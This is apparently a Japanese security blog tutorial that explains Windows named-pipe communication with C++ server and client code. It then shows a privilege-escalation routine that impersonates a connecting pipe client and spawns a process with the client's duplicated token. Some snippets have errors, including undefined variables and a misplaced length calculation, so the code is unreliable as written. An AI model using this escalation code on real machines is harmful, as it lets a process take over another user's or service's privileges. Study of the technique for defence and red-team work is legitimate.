---
title: Namedpipe-Privilege-Escalation
date: 2021-01-27 10:00:00 +09:00
categories: [Windows, Technique, Privilege Escalation]
tags: [Windows, Privilege Escalation]
---

PipeはWindowsでプロセス間通信に用いられる技術です。
これはプロセスが異なるネットワーク上にある場合でもプロセス間でデータのやり取るが可能です。
Pipeを作成するプロセスをPipe serverといい、Pipeに接続するプロセスをPipe clientと言います。

Named pipeはPipeを作成時に名前を設定します。
また、これとは逆にAnonymous pipeも存在しますが、今回の範囲ではないため触れません。

# Named pipe
それでは実際にコードを作成して通信をしてみたいと思います。
Pipe名は`mi2-Pipe`で作成してきます。

## Pipe server
まず最初にPipe serverの方から書いていきます。

流れ的には下記のようになります。
```
CreateNamedPipe->ConnectNamedPipe->WriteFile
```

1. [CreateNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)関数でNamed pipeを作成します。
1. [ConnectNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)関数でPipeへの接続を待ちます。
1. [WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)関数でclientへメッセージを送ります。

```cpp
int server() {
  LPCWSTR lpName{ L"\\\\.\\pipe\\mi2-Pipe" };  // Pipe名
  HANDLE hPipe{ 0 };  // Pipeハンドル
  LPCWSTR lpMsg{ L"I Love Asuka Sito" };  // クライアントがコネクションしてきたら送るメッセージ

  hPipe = CreateNamedPipe(
    lpName,  // Pipe名
    PIPE_ACCESS_DUPLEX,  // 双方向通信 
    PIPE_TYPE_MESSAGE,   // 
    1,  // インスタンスの最大数
    1024,  // 出力バッファサイズ
    1024,  // 入力バッファサイズ
    0,  // タイムアウト間隔
    nullptr);  // セキュリティ記述子

  if (ConnectNamedPipe(hPipe, nullptr))  // Pipeハンドル, OVERLAPPED構造体へのポインタ
    WriteFile(hPipe, lpMsg, (wcslen(lpMsg + 1) * 2), nullptr, nullptr);

  if (hPipe)
    CloseHandle(hPipe);
  return 0;
}
```

## Pipe client
次にPipe clientの方を書いていきます。

流れ的には下記のようになります。
```
CreateFile->ReadFile
```

1. [CreateFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)関数でハンドルを取得します。
1. [ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile)関数でserverから送られてくるメッセージを受け取ります。

```cpp
int client() {
  LPCWSTR lpName{ L"\\\\127.0.0.1\\pipe\\mi2-Pipe" };
  HANDLE hPipe{ 0 };
  bool bPipeRead{ true };
	wchar_t lpMsg[1024]{ 0 };

  hPipe = CreateFile(lpName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

  while (bPipeRead) {
		bPipeRead = ReadFile(hPipe, &lpMsg, 1024, nullptr, nullptr);
		wcout << "Received message: " << Msg;
	}

  if (hPipe)
    CloseHandle(hPipe);
  return 0;
}
```

# Privilege Escalation
それでは今回の本題とも言える、権限昇格をしていきます。
権限昇格には[ImpersonateNamedPipeClient](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)関数を使用します。
この関数は、PipeのClient側のアクセストークンをServer側が引き継ぐことができる関数です。

流れ的には下記のようになります。
```
ImpersonateNamedPipeClient->OpenThreadToken->DuplicateTokenEx->CreateProcesWithToken
```

1. [ImpersonateNamedPipeClient](https://docs.microsoft.com/ja-jp/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)関数でClient側のトークンをServer側が引き継ぎます。
1. [OpenThreadToken](https://docs.microsoft.com/ja-jp/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken)関数でCurrentThreadのトークンを取得します。
1. [DuplicateTokenEx](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)関数でトークンの複製をします。
1. [CreateProcessWithToken](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)関数で複製したトークンでプロセスを作成します。

```cpp
int escalation() {
  LPCWSTR lpName{ L"\\\\.\\pipe\\mi2-Pipe" };
  HANDLE hPipe{ 0 };
  LPCWSTR lpMsg{ L"I Love Asuka Sito" };
  HANDLE hToken{ 0 };
	HANDLE hNewToken{ 0 };

  hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 1024, 1024, 0, nullptr);

  if (ConnectNamedPipe(hPipe, nullptr))
    WriteFile(hPipe, lpMsg, (wcslen(lpMsg + 1) * 2), nullptr, nullptr);

  ImpersonateNamedPipeClient(hPipe);

	OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken);
	DuplicateTokenEx(hToken, NULL, nullptr, SecurityImpersonation, TokenPrimary, &hNewToken);
	CreateProcessWithTokenW(hNewToken, 0, nullptr, lpCmd, NULL, nullptr, nullptr, nullptr, nullptr);

  if (hNewToken)
    CloseHandle(hNewToken);
  if (hToken)
    CloseHandle(hToken);
  if (hPipe)
    CloseHandle(hPipe);
  return 0;
}
```

# Reference
[Windows NamedPipes 101 + Privilege Escalation - Red Teaming Experiments](https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
[Impersonating a Named Pipe Client - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/ipc/impersonating-a-named-pipe-client)
[Named Pipes - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)
[名前付きパイプ - Wikipedia](https://ja.wikipedia.org/wiki/%E5%90%8D%E5%89%8D%E4%BB%98%E3%81%8D%E3%83%91%E3%82%A4%E3%83%97)